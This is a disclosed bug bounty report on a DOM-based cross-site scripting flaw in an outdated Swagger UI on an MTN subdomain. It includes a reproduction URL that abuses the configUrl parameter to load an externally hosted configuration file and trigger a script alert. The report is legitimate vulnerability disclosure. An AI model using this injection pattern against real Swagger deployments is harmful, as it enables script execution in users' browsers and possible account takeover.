# DOM Based Reflected Cross Site Scripting

## Report Details
- **Report ID**: 2321874
- **URL**: https://hackerone.com/reports/2321874
- **State**: Closed
- **Severity**: high
- **Submitted**: 2024-01-16T08:09:58.518Z
- **Disclosed**: 2024-12-25T08:12:51.681Z

## Reporter
- **Username**: nhx1
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
## Summary:
I hope you're doing well. I stumbled upon one of your assets. Upon further inspection I realized that the asset was running an outdated version of Swagger. 
The outdated version of Swagger is well-known for Cross-Site Scripting vulnerabilities so I went ahead and attempted to test it in  https://notification-server-v2.sz-my.mtn.com/.  Turns out, it's vulnerable to Cross-Site Scripting. To reproduce it, please follow the steps of reproduction. I have not assessed the full impact of this vulnerability but it is highly probable that a malicious actor could exploit to takeover accounts of applications hosted under *.mtn.com. I hope this gets patched soon. If there's some additional information that you need from my side, please let me know. Thank you. 

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Go to the following URL https://notification-server-v2.sz-my.mtn.com/index.html?configUrl=https://jumpy-floor.surge.sh/test.json
  1. Observe the alert pop up like in the screenshot below
  

{F2983813}

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

A malicious actor could execute arbitrary scripts

## Attachments
- Screenshot_from_2024-01-16_13-36-09.png
